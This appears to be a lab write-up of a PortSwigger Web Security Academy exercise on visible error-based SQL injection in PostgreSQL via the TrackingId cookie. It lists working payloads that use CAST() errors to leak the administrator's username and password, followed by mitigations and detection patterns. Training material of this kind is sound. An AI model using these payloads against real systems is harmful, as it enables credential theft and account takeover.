@@ -1,0 +1,637 @@
+# Visible Error-Based SQL Injection
+
+**Lab:** Visible error-based SQL injection
+**Category:** SQL Injection
+**Difficulty:** Practitioner
+**Platform:** PortSwigger Web Security Academy
+
+---
+
+# Executive Summary
+
+The application was vulnerable to a **Visible Error-Based SQL Injection** through the `TrackingId` cookie.
+
+The application incorporated the user-controlled cookie value into a PostgreSQL query without properly parameterizing it. Furthermore, database errors were returned directly to the client.
+
+This combination allowed an attacker to manipulate the SQL query and deliberately cause PostgreSQL to generate an error containing data extracted from the database.
+
+By exploiting the `CAST()` function, it was possible to force PostgreSQL to convert database values such as usernames and passwords into integers. Because these values were not valid integers, PostgreSQL included the original value in the resulting error message.
+
+The attack was used to:
+
+1. Confirm SQL injection.
+2. Identify the database behavior as PostgreSQL.
+3. Construct a valid injected SQL condition.
+4. Query the `users` table.
+5. Identify the `administrator` account.
+6. Extract the administrator's password through a database error.
+7. Authenticate as the `administrator` user.
+
+The laboratory was successfully solved.
+
+---
+
+# Vulnerability Classification
+
+| Attribute     | Value                                                                       |
+| ------------- | --------------------------------------------------------------------------- |
+| Vulnerability | Visible Error-Based SQL Injection                                           |
+| CWE           | CWE-89 – Improper Neutralization of Special Elements used in an SQL Command |
+| OWASP Top 10  | A03:2021 – Injection                                                        |
+| Severity      | High                                                                        |
+| CVSS v3.1     | 8.8 (High)                                                                  |
+
+> The exact CVSS score depends on the privileges available through the vulnerable database connection and the impact on the real application. The score above is an assessment for this laboratory scenario.
+
+---
+
+# Target
+
+**Application:** PortSwigger Web Security Academy
+
+**Injection Point:**
+
+```http
+Cookie: TrackingId=...
+```
+
+**Database:** PostgreSQL
+
+**Target Account:**
+
+```text
+administrator
+```
+
+---
+
+# Objective
+
+Exploit the SQL injection vulnerability in the `TrackingId` cookie to retrieve the password of the `administrator` account and authenticate successfully.
+
+---
+
+# Methodology
+
+1. Identify the `TrackingId` cookie as an injection point.
+2. Confirm SQL injection using a single quotation mark.
+3. Use SQL comments to neutralize the remainder of the original query.
+4. Construct a valid boolean SQL expression.
+5. Test a subquery using `SELECT`.
+6. Query the `users` table.
+7. Restrict the query to one row using `LIMIT 1`.
+8. Abuse PostgreSQL's `CAST()` error message to disclose the username.
+9. Replace `username` with `password`.
+10. Extract the administrator's password.
+11. Authenticate as `administrator`.
+
+---
+
+# Initial Request
+
+The vulnerable request contained the following cookie:
+
+```http
+GET /filter?category=Food+%26+Drink HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: TrackingId=FelTOpRuBMi8tnD9; session=...
+```
+
+The `TrackingId` parameter was identified as the potential injection point.
+
+---
+
+# Identifying the SQL Injection
+
+The original cookie value:
+
+```text
+TrackingId=FelTOpRuBMi8tnD9
+```
+
+was modified by appending a single quotation mark:
+
+```text
+TrackingId=FelTOpRuBMi8tnD9'
+```
+
+The server returned an HTTP 500 response containing a verbose database error.
+
+The error indicated that the injected value was being interpreted inside a SQL string.
+
+This demonstrated that the application was directly incorporating the `TrackingId` value into a SQL query.
+
+---
+
+# Commenting the Original Query
+
+The single quotation mark closed the SQL string, but the remainder of the application's original query still remained.
+
+To prevent the remaining SQL from interfering with the injection, SQL comment syntax was appended:
+
+```text
+'--
+```
+
+The resulting payload was:
+
+```text
+TrackingId='--
+```
+
+The `--` sequence caused PostgreSQL to treat the remainder of the SQL statement as a comment.
+
+The resulting behavior no longer generated the original syntax error, confirming that the injected query was syntactically valid.
+
+---
+
+# Constructing a SQL Expression
+
+The next payload introduced a subquery and attempted to cast its result to an integer:
+
+```text
+TrackingId=' AND CAST((SELECT 1) AS int)--
+```
+
+The server returned an error indicating that the expression following `AND` needed to be a Boolean expression.
+
+The problem was that:
+
+```sql
+CAST((SELECT 1) AS int)
+```
+
+returns an integer rather than a Boolean value.
+
+---
+
+# Creating a Boolean Condition
+
+A comparison operator was introduced:
+
+```text
+TrackingId=' AND 1=CAST((SELECT 1) AS int)--
+```
+
+This produced the equivalent of:
+
+```sql
+AND 1 = CAST((SELECT 1) AS int)
+```
+
+The expression evaluates to a Boolean value and is therefore valid in the `WHERE` clause.
+
+The server returned a normal response, confirming that the injected SQL was syntactically valid.
+
+---
+
+# Querying the `users` Table
+
+The generic subquery:
+
+```sql
+SELECT 1
+```
+
+was replaced with:
+
+```sql
+SELECT username FROM users
+```
+
+The resulting payload was:
+
+```text
+TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+```
+
+Initially, this produced an error because the subquery could return multiple rows.
+
+The reason is that:
+
+```sql
+SELECT username FROM users
+```
+
+can return:
+
+```text
+administrator
+carlos
+...
+```
+
+while the `CAST()` expression expects a single value.
+
+---
+
+# Restricting the Result to One Row
+
+The query was modified to use:
+
+```sql
+LIMIT 1
+```
+
+The final username extraction payload was:
+
+```text
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+
+The server returned:
+
+```text
+ERROR: invalid input syntax for type integer: "administrator"
+```
+
+This was the critical information disclosure.
+
+The application had effectively caused PostgreSQL to execute:
+
+```sql
+CAST('administrator' AS int)
+```
+
+Since `administrator` is not a valid integer, PostgreSQL generated an error containing the original value.
+
+Therefore:
+
+```text
+username = administrator
+```
+
+---
+
+# Extracting the Password
+
+The same technique was then applied to the `password` column.
+
+The query was modified from:
+
+```sql
+SELECT username
+```
+
+to:
+
+```sql
+SELECT password
+```
+
+The final payload was:
+
+```text
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+
+PostgreSQL attempted to convert the administrator's password into an integer.
+
+Because the password was an alphanumeric string rather than an integer, the database generated an error containing the password.
+
+The error therefore acted as a data exfiltration mechanism.
+
+---
+
+# Why the Attack Worked
+
+The vulnerability depended on **two separate security failures**.
+
+### 1. SQL Injection
+
+The application trusted the `TrackingId` cookie and incorporated it directly into a SQL query.
+
+Conceptually, the application behaved like:
+
+```sql
+SELECT ...
+FROM ...
+WHERE TrackingId = '<TrackingId>';
+```
+
+Because the value was not parameterized, the attacker could terminate the string:
+
+```text
+'
+```
+
+and append arbitrary SQL.
+
+---
+
+### 2. Verbose Database Errors
+
+The application returned PostgreSQL's database error messages directly to the client.
+
+This was particularly dangerous because PostgreSQL included the value that failed the conversion:
+
+```text
+ERROR: invalid input syntax for type integer: "administrator"
+```
+
+The attacker could therefore deliberately create an error that reflected a database value.
+
+---
+
+# Technical Exploitation
+
+The final injection can be conceptually broken down into several components:
+
+```text
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+│     │   │              │                         │
+│     │   │              │                         └── SQL comment
+│     │   │              └── Return one password
+│     │   └── Convert the returned value to integer
+│     └── Boolean comparison
+└── Close the original SQL string
+```
+
+The database effectively processes something conceptually similar to:
+
+```sql
+WHERE TrackingId = ''
+AND 1 = CAST(
+    (SELECT password FROM users LIMIT 1)
+    AS int
+)
+-- remaining original query
+```
+
+Suppose the password were:
+
+```text
+abc123
+```
+
+PostgreSQL would attempt:
+
+```sql
+CAST('abc123' AS int)
+```
+
+which would generate:
+
+```text
+ERROR: invalid input syntax for type integer: "abc123"
+```
+
+The attacker therefore obtains the value without the application ever intentionally returning it.
+
+---
+
+# Attack Flow
+
+```text
+Attacker
+    │
+    ▼
+TrackingId cookie
+    │
+    ▼
+Close SQL string
+    │
+    ▼
+Inject SELECT subquery
+    │
+    ▼
+Retrieve database value
+    │
+    ▼
+CAST(value AS int)
+    │
+    ▼
+PostgreSQL conversion error
+    │
+    ▼
+Error contains original value
+    │
+    ▼
+Attacker extracts sensitive data
+    │
+    ▼
+Administrator credentials
+```
+
+---
+
+# HTTP Evidence
+
+## Initial Injection
+
+```http
+Cookie: TrackingId=FelTOpRuBMi8tnD9'
+```
+
+Result:
+
+```text
+HTTP/2 500 Internal Server Error
+```
+
+The verbose error confirmed SQL parsing of the supplied value.
+
+---
+
+## Valid SQL Condition
+
+```http
+Cookie: TrackingId=' AND 1=CAST((SELECT 1) AS int)--
+```
+
+Result:
+
+```text
+HTTP/2 200 OK
+```
+
+This confirmed that the injected expression was syntactically valid.
+
+---
+
+## Username Extraction
+
+```http
+Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+
+Result:
+
+```text
+HTTP/2 500 Internal Server Error
+```
+
+Database error:
+
+```text
+ERROR: invalid input syntax for type integer: "administrator"
+```
+
+This disclosed the first username.
+
+---
+
+## Password Extraction
+
+```http
+Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+
+The resulting PostgreSQL error disclosed the administrator password.
+
+The extracted credentials were then used to authenticate successfully.
+
+---
+
+# Root Cause
+
+The root cause was the combination of:
+
+* Direct concatenation of user-controlled input into a SQL query.
+* Lack of parameterized queries.
+* Exposure of raw database errors.
+* Insufficient error handling.
+* Excessive database privileges, depending on the application architecture.
+
+The application effectively allowed the attacker to control part of the SQL syntax.
+
+---
+
+# Impact
+
+An attacker could potentially:
+
+* Read arbitrary database values.
+* Extract usernames and passwords.
+* Access sensitive application information.
+* Compromise privileged accounts.
+* Modify or delete database records if the database account had sufficient privileges.
+* Potentially escalate the attack to broader application compromise.
+
+In this lab, exploitation resulted in the disclosure of the administrator password and successful authentication as the privileged user.
+
+---
+
+# Security Recommendations
+
+## Use Parameterized Queries
+
+The primary mitigation is to use prepared statements rather than concatenating user-controlled input into SQL.
+
+For example:
+
+```sql
+SELECT ...
+FROM ...
+WHERE TrackingId = $1;
+```
+
+The `TrackingId` value should be supplied as a parameter rather than embedded into the SQL statement.
+
+---
+
+## Never Expose Database Errors
+
+Database errors should be logged internally but should not be returned directly to users.
+
+Instead of:
+
+```text
+ERROR: invalid input syntax for type integer: "administrator"
+```
+
+the application should return a generic error such as:
+
+```text
+Internal server error
+```
+
+while recording the detailed database error in a protected server-side log.
+
+---
+
+## Apply Least Privilege
+
+The application's database account should have only the permissions required for normal application functionality.
+
+For example, an analytics query should not necessarily have permission to read authentication credentials.
+
+---
+
+## Protect Credentials
+
+Passwords should never be stored in plaintext.
+
+They should be stored using an appropriate password hashing algorithm, such as:
+
+```text
+Argon2id
+bcrypt
+scrypt
+```
+
+Even if SQL injection occurs, properly hashed passwords significantly reduce the immediate impact of credential disclosure.
+
+---
+
+## Implement Security Monitoring
+
+Applications should monitor for suspicious SQL injection patterns, including:
+
+```text
+'
+--
+CAST(
+SELECT
+UNION
+```
+
+Detection should complement, rather than replace, secure query construction.
+
+---
+
+# References
+
+* OWASP Top 10 2021 – A03: Injection
+* CWE-89 – Improper Neutralization of Special Elements used in an SQL Command
+* PortSwigger Web Security Academy – SQL Injection
+* PortSwigger Web Security Academy – Visible Error-Based SQL Injection
+
+---
+
+# Conclusion
+
+The application was vulnerable to **Visible Error-Based SQL Injection** through the `TrackingId` cookie.
+
+The vulnerability resulted from directly incorporating user-controlled input into a SQL query and exposing detailed PostgreSQL errors to the client.
+
+The attack first closed the original SQL string and commented out the remaining query. A Boolean expression containing a `SELECT` subquery was then introduced.
+
+The key technique was:
+
+```sql
+CAST((SELECT password FROM users LIMIT 1) AS int)
+```
+
+By forcing PostgreSQL to convert the retrieved password into an integer, the database generated an error containing the original password value.
+
+This transformed the database error into an information-disclosure mechanism.
+
+The attack ultimately allowed the `administrator` credentials to be recovered and used to authenticate successfully.
+
+---
+
+# Key Takeaways
+
+* SQL injection can be exploited even when the application does not intentionally return query results.
+* Verbose database errors can become an effective data-exfiltration channel.
+* `CAST()` can be abused to force sensitive database values into error messages.
+* `LIMIT 1` is useful when a scalar subquery must return exactly one row.
+* SQL comments can be used to neutralize the remainder of the original query.
+* PostgreSQL error messages can reveal sensitive information when they are exposed to clients.
+* Parameterized queries are the primary defense against SQL injection.
+* Detailed database errors should be logged server-side rather than exposed to users.
+
+---
+
+**Lab Status:** ✅ Solved
